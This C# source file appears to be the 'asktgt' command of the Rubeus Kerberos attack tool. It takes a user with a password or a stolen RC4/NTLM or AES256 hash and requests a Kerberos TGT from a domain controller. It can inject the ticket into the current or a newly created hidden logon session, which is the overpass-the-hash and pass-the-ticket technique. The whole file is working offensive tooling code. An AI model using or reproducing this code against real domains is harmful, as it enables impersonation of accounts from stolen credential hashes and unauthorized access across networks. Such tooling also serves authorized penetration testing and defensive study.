using System;
using System.Collections.Generic;


namespace Rubeus.Commands
{
    public class Asktgt : ICommand
    {
        public static string CommandName => "asktgt";

        public void Execute(Dictionary<string, string> arguments)
        {
            string user = "";
            string domain = "";
            string password = "";
            string hash = "";
            string dc = "";
            bool ptt = false;
            Interop.LUID luid = new Interop.LUID();
            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial;

            if (arguments.ContainsKey("/user"))
            {
                string[] parts = arguments["/user"].Split('\\');
                if (parts.Length == 2)
                {
                    domain = parts[0];
                    user = parts[1];
                }
                else
                {
                    user = arguments["/user"];
                }
            }
            if (arguments.ContainsKey("/domain"))
            {
                domain = arguments["/domain"];
            }
            if (arguments.ContainsKey("/dc"))
            {
                dc = arguments["/dc"];
            }
            if (arguments.ContainsKey("/password"))
            {
                password = arguments["/password"];
                if (arguments.ContainsKey("/enctype") && arguments["/enctype"].ToUpper().Equals("AES256"))
                {
                    encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;

                    // compute AES key from pwd
                    byte[] password_bytes = System.Text.Encoding.UTF8.GetBytes(password);
                    byte[] salt = System.Text.Encoding.UTF8.GetBytes(domain.ToUpper() + user);

                    byte[] aes256_key = Crypto.ComputeAES256KerberosKey(password_bytes, salt);
                    hash = System.BitConverter.ToString(aes256_key).Replace("-", "");
                }
                else // default is RC4
                {
                    // compute NTLM from pwd
                    encType = Interop.KERB_ETYPE.rc4_hmac;
                    byte[] ntlm = Crypto.ComputeRC4KerberosKey(password); // a.k.a NTLM
                    hash = System.BitConverter.ToString(ntlm).Replace("-", "");
                }
            }
            if (arguments.ContainsKey("/rc4"))
            {
                hash = arguments["/rc4"];
                encType = Interop.KERB_ETYPE.rc4_hmac;
            }
            if (arguments.ContainsKey("/aes256"))
            {
                hash = arguments["/aes256"];
                encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            }
            if (arguments.ContainsKey("/ptt"))
            {
                ptt = true;
            }

            if (arguments.ContainsKey("/luid"))
            {
                try
                {
                    luid = new Interop.LUID(arguments["/luid"]);
                }
                catch
                {
                    Console.WriteLine("[X] Invalid LUID format ({0})\r\n", arguments["/luid"]);
                    return;
                }
            }

            if (arguments.ContainsKey("/createnetonly"))
            {
                // if we're starting a hidden process to apply the ticket to
                if (!Helpers.IsHighIntegrity())
                {
                    Console.WriteLine("[X] You need to be in high integrity to apply a ticket to created logon session");
                    return;
                }
                if (arguments.ContainsKey("/show"))
                {
                    luid = LSA.CreateProcessNetOnly(arguments["/createnetonly"], true);
                }
                else
                {
                    luid = LSA.CreateProcessNetOnly(arguments["/createnetonly"], false);
                }
                Console.WriteLine();
            }

            if (String.IsNullOrEmpty(user))
            {
                Console.WriteLine("\r\n[X] You must supply a user name!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(domain))
            {
                domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            }
            if (String.IsNullOrEmpty(hash))
            {
                Console.WriteLine("\r\n[X] You must supply a /password or /rc4 hash or /aes256 hash!\r\n");
                return;
            }

            if (!((encType == Interop.KERB_ETYPE.rc4_hmac) || (encType == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)))
            {
                Console.WriteLine("\r\n[X] Only /rc4 and /aes256 are supported at this time.\r\n");
                return;
            }
            else
            {
                Ask.TGT(user, domain, hash, encType, ptt, dc, luid);
                return;
            }
        }
    }
}